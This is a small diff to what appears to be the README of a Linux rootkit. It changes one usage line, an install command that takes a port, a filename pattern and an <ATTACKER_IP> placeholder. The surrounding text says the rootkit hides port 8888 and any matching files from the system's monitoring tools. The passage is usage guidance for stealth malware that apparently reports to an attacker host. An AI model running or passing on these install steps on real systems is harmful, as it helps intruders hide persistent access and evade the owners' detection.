@@ -13,7 +13,7 @@ sudo apt-get install net-tools build-essential git linux-headers-$(uname -r)
 
 ## How to install and use the rootkit
 ```
-install_rootkit.sh -p 8888 -pat naughty_pipe -ip <ATTACKER_IP>
+./install_rootkit.sh -p 8888 -pat naughty_pipe -ip <ATTACKER_IP>
 ```
 This will install the rootkit and hide the `port 8888` and any file/directory that matches the `pattern "naughty_pipe"` from any monitoring tool of the sistem.
 
